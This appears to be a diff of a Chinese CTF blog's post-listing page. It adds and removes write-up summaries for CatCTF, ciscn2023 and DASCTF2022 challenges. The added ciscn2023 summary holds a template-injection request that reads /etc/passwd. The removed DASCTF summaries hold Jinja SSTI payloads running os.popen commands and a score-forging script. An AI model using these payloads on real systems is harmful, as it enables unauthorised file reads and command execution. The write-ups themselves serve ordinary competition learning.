@@ -110,6 +110,39 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/catctf/">CatCTF</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">MISC Cat_Jump 尝试了去打开玩游戏但是没搞定，直接strings了 非预期
+strings xxx | grep CatCTF{
+Peekaboo MeowMeow CatCTF{CAT_GOES_MEOW} ,010打开看ascii的形状，ctfshow有一道这样的题
+miao~ strings 了一下，出现这一堆
+网上有些题是 直接看属性有东西，exiftool没发现啥
+foremost 出 wav ，频谱图
+CatCTF 某个密码
+试试jpg隐写的工具，都没试出来，卡这里了，wav我也去尝试了silenteye没结果
+正确是DeepSound工具解密，之前没用过 ,选择wav输入密码，得到个flag.txt
+在他默认保存路径可以打开flag.txt
+然后兽语解密
+CatCat 这个文件名一看就猜测是 rabbit加密 和base91
+rabbit的密钥，jpg用010打开搜索pass
+密钥是catflag
+然后base91
+这一看就是Ook解密，将cat替换成Ook
+CatchCat 可爱的猫猫走丢了，还好猫猫有GPS定位装置，我们陆陆续续在终端收到了GPS数据，你能帮忙找到可爱的猫猫吗？
+给了一堆GPGGA的数据，找了很久没有找到合适的网站
+想着提取出经纬度
+f= open(&#39;1.txt&#39;) lines = f.readlines() for line in lines: print(line[17:30]+&#39;,&#39;+line[33:47]) 刚开始用gnuplot画个图，但是画出来看不出啥，想着去用谷歌地球画路线，不过需要KML文件
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;kml xmlns=&#34;http://www.opengis.net/kml/2.2&#34;&gt; &lt;Document&gt; &lt;name&gt;KML&lt;/name&gt; &lt;description&gt;KML&lt;/description&gt; &lt;Placemark&gt; &lt;name&gt;[2011/2/1 19:59:14]&lt;/name&gt; &lt;description&gt;line&lt;/description&gt; &lt;LineString&gt; &lt;coordinates&gt; 3416.48590278,10856.86623887 3416.48590278,10856.86623887 .......................... &lt;/coordinates&gt; &lt;/LineString&gt; &lt;/Placemark&gt; &lt;/Document&gt; &lt;/kml&gt; 将经纬度替换后，导入谷歌地球</div><div class="post-footer">
+        <a href="/posts/ctf/catctf/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/">ciscn2023初赛</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">go_session GET /admin?name={%25%20include%20c.Request.Header.Accept.0%20%25} HTTP/1.1Host: 123.56.99.60:12488Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36Accept: /etc/passwdAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session-name=MTY4NTE2NjEzNnxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUFqXzRJQUFRWnpkSEpwYm1jTUJnQUVibUZ0WlFaemRISnBibWNNQndBRllXUnRhVzQ9fEDXM_0GyRu_LshoipBIWA6dvJ8u4d-oTgM7OGlKvC2SConnection: close 实现任意文件读取
+还是</div><div class="post-footer">
+        <a href="/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/ctf/d3ctf-2023/">D^3ctf 2023</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web EscapePlan 源码是ban了很多字符和关键字
@@ -161,30 +194,6 @@ file.php
 &lt;?php class Upload { public $f; public $fname; public $fsize; function __construct(){ $this-&gt;f = $_FILES; } function savefile() { $fname = md5($this-&gt;f[&#34;file&#34;][&#34;name&#34;]).&#34;.png&#34;; if(file_exists(&#39;./upload/&#39;.$fname)) { @unlink(&#39;./upload/&#39;.$fname); } move_uploaded_file($this-&gt;f[&#34;file&#34;][&#34;tmp_name&#34;],&#34;upload/&#34; . $fname); echo &#34;upload success! :D&#34;; } function __toString(){ $cont = $this-&gt;fname; $size = $this-&gt;fsize; echo $cont-&gt;$size; return &#39;this_is_upload&#39;; } function uploadfile() { if($this-&gt;file_check()) { $this-&gt;savefile(); } } function file_check() { $allowed_types = array(&#34;png&#34;); $temp = explode(&#34;.</div><div class="post-footer">
         <a href="/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/">DASCTF2022九月赛</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">dino3d 一个前端小游戏
-抓包 看到/check.php 和 post 的参数，是score我们要够1000000，后面的checkCode和tm应该也要构造
-翻js源码，美化一下
-找sn() ，发现e就是source，t=checkCode ，source随便我们写
-找checkCode ，DASxCBCTF_wElc03e
-可以构造了，写个脚本
-import time import hashlib import requests url = &#34;http://node4.buuoj.cn:28130/check.php&#34; score = &#39;1000000&#39; code= &#39;DASxCBCTF_wElc03e&#39; checkCode = hashlib.md5((score+code).encode()).hexdigest() tm = int(str(time.time())[0:10]) #这里最终要为int,否则脚本跑的不好 data = { &#39;score&#39; : score, &#39;checkCode&#39; : checkCode, &#39;tm&#39; : tm } print(checkCode) print(tm) res = requests.post(url=url,data=data) print(res.text) Text Reverser SSTI 加上 一个文本逆转
-过滤了{{}} 可以试试{%print(1)%}
-进行逆转然后传参 有返回值1
-可以利用 {%print(1)%} 来进行payload构造
-lipsum这条路真的很方便
-{{lipsum.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}{{lipsum.__globals__.os.popen(&#39;whoami&#39;).read()}}{{lipsum.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;)}} 直接就rce 了</div><div class="post-footer">
-        <a href="/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/">DASCTF2022十月赛</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">EasyPOP 源码附上
-&lt;?php highlight_file(__FILE__); error_reporting(0); class fine { private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; } public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = &#34;&#34;; die(&#34;Go listen to Jay Chou&#39;s secret-code! Really nice&#34;); } } class show { public $ctf; public $time = &#34;Two and a half years&#34;; public function __construct($ctf) { $this-&gt;ctf = $ctf; } public function __toString() { return $this-&gt;ctf-&gt;show(); } public function show(): string { return $this-&gt;ctf .</div><div class="post-footer">
-        <a href="/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -209,7 +218,7 @@ lipsum这条路真的很方便
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/7/">7</a>
+                        <a href="/page/8/">8</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
